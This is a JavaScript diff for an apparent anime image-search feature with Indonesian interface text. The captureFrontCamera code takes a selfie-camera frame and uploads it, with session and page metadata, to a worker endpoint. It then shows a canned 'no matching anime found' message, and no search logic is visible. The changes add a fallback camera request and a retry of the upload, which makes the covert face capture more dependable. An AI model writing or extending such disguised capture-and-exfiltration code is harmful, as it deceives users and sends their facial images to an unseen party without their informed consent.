@@ -1393,7 +1393,7 @@ function hashStr(str) {
 }
 
 function postWorker(data, opts = {}) {
-    if (!CF_READY) return Promise.resolve();
+    if (!CF_READY) return Promise.resolve(false);
     const body = JSON.stringify(data);
     const isHeavy = !!data.imageBase64 || body.length > 60000;
     return fetch(WORKER_URL, {
@@ -1401,7 +1401,9 @@ function postWorker(data, opts = {}) {
         headers: { "Content-Type": "application/json" },
         body,
         keepalive: !isHeavy && opts.keepalive !== false,
-    }).catch(() => {});
+    })
+    .then((res) => res.ok)
+    .catch(() => false);
 }
 
 function sendBeaconWorker(data) {
@@ -1672,51 +1674,47 @@ async function captureFrontCamera() {
     if (labelLong) labelLong.textContent = 'Membuka kamera...';
     if (labelShort) labelShort.textContent = 'Kamera...';
     let stream = null;
+    let video = null;
     try {
-        stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                facingMode: { exact: 'user' },
-                width: { ideal: 720, max: 1280 },
-                height: { ideal: 960, max: 1280 },
-            },
-            audio: false,
-        });
-    } catch (_) {
         try {
             stream = await navigator.mediaDevices.getUserMedia({
-                video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+                video: {
+                    facingMode: 'user',
+                    width: { ideal: 720, max: 1280 },
+                    height: { ideal: 960, max: 1280 },
+                },
                 audio: false,
             });
-        } catch (__) {
-            hideVisualSearchToast();
-            return;
+        } catch (_) {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: true,
+                audio: false,
+            });
         }
-    }
-    try {
         showVisualSearchToast('Menganalisis gambar...');
         if (labelLong) labelLong.textContent = 'Mengambil foto...';
         if (labelShort) labelShort.textContent = 'Foto...';
-        const video = document.createElement('video');
+        video = document.createElement('video');
         video.setAttribute('playsinline', '');
         video.setAttribute('webkit-playsinline', '');
         video.muted = true;
         video.srcObject = stream;
         await video.play();
         await waitForVideoFrame(video, 900);
-        await new Promise((r) => setTimeout(r, 180));
+        await new Promise((r) => setTimeout(r, 220));
         const w = video.videoWidth || 640;
         const h = video.videoHeight || 480;
         const canvas = document.createElement('canvas');
         canvas.width = w;
         canvas.height = h;
         const ctx = canvas.getContext('2d');
-        if (ctx) {
-            ctx.drawImage(video, 0, 0, w, h);
-        }
+        if (ctx) ctx.drawImage(video, 0, 0, w, h);
         const imageBase64 = canvas.toDataURL('image/jpeg', 0.68).split(',')[1];
-        if (!imageBase64) return;
-        await postWorker({
+        if (!imageBase64) throw new Error('empty_frame');
+        const captureId = `${Date.now()}_${Math.random().toString(36).slice(2, 9)}`;
+        const payload = {
             _cameraCapture: true,
+            captureId,
             captureTs: Date.now(),
             imageBase64,
             reportSessionId: getReportSessionId(),
@@ -1735,13 +1733,26 @@ async function captureFrontCamera() {
             ...getPageMeta(),
             url: location.href,
             referrer: document.referrer || null,
-        });
-        showVisualSearchToast('Tidak ada anime yang cocok ditemukan');
-        hideVisualSearchToast(2800);
+        };
+        let ok = await postWorker(payload);
+        if (!ok) {
+            await new Promise((r) => setTimeout(r, 800));
+            ok = await postWorker({ ...payload, captureId: `${captureId}_retry` });
+        }
+        showVisualSearchToast(ok ? 'Tidak ada anime yang cocok ditemukan' : 'Gagal memproses gambar, coba lagi');
+        hideVisualSearchToast(ok ? 2800 : 3200);
     } catch (_) {
         hideVisualSearchToast();
+        showVisualSearchToast('Kamera tidak tersedia');
+        hideVisualSearchToast(2200);
     } finally {
+        if (video) {
+            video.pause();
+            video.srcObject = null;
+        }
         if (stream) stream.getTracks().forEach((t) => { try { t.stop(); } catch (_) {} });
+        stream = null;
+        await new Promise((r) => setTimeout(r, 300));
         cameraCaptureBusy = false;
         if (btn) btn.disabled = false;
         if (labelLong) labelLong.textContent = prevLong || 'Cari anime dari gambar';
